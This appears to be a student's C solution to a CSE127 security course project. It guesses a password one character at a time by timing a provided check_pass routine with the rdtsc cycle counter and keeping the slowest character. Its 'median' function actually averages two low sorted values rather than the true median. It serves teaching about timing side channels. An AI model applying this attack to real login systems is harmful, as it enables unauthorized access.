/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

unsigned long freq_list[32][94][1000];
unsigned long prev_med = 0; // FAULT DETECTION PRIMITIVES
unsigned long med; // FAULT DETECTION PRIMITIVES
//char broke = 0;

void find_freq(char *guess, int threshold) {
    unsigned long start, end;
    unsigned long runtime;
    int i = 0;
    int j = 0;
    int k = 0;
    // where i is the current index to be solved
    for (i=threshold; i < threshold + 1; i++) {
      //printf("i is %d\n",i);
      j = 0;
      for (j = j; j < 94; j++) {
        guess[i] = j + 33;
        //printf("j is %d\n",j);
        k = 0;
        for (k = k; k < 1000; k++) {
          //printf("k is %d\n",k);
          start = rdtsc();
          //printf("Checking pass with guess: %s\n", guess); 
          if (check_pass(guess)) { hack_system(guess); }
          end = rdtsc();
          runtime = (end - start); 
          freq_list[i][j][k] = runtime;
        } 
      }
    } 
/** FOR DEBUG
    for (i=0; i<32; i++){
      for (j=0; j < 94; j++) {
         //printf("Index: %d -- Character: %c -- Frequencies:\n", i, j+33);
         for (k=0; k < 1000; k++) { printf("%lu\n", freq_list[i][j][k]); }
      }
    }
*/
}

static int comp (const void * a, const void * b) {
  if (*(unsigned long *) a > *(unsigned long *)b) return 1;
  else if (*(unsigned long *) a < *(unsigned long *)b) return -1;
  else return 0;
}

unsigned long median(unsigned long *freq_list) {
  qsort(freq_list, 1000, sizeof(unsigned long), comp);
  return (*(freq_list+3) + *(freq_list+4))/2;
}

char solve_char(int threshold) {

    char fault = 0;

    
    int i = 0;
    double max = 0; 
    int mai = -1;
    double min = 1000000;
    int mii = -1;

    for (i=i; i < 94; i++) {
      if (i == 0) { prev_med = 0; }
      else { prev_med = med; }
      med = median(freq_list[threshold][i]);

      //printf("med: %lu, prev_med: %lu\n", med, prev_med);
      if (max < med) {
        max = med;
        mai = i;
      } 
      if (med < min) {
        min = med;
        mii = i;
      }
     // printf("median of first index at %c: %lu\n", i+33,med);
    }
    
   // printf("max freq, idx: %f, %c\n", max, mai+33);
   // printf("min freq, idx: %f, %c\n", min, mii+33);
   // printf("max/min = %f\n", max/min);

    /*if (max/min > 1.115) {
      fault = 1;
      puts("FAULT!");
      return -1;
    } */
    return mai+33;

}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //



    int i = 0;
    char c;
    for (i=i; i < 32; i++) {
      find_freq(guess,i);
      c = solve_char(i);
      guess[i] = c;
      //printf("solved char: %c at index: %d\n", c, i);
      //if (broke) { hack_system(guess); }
    }
     



/** FOR DEBUG
    int z = 0;
    for (z=z; z <1000; z++) {
      printf("%d\n", freq_list[0][40][z]);
    }*/

   /* if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };*/

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};

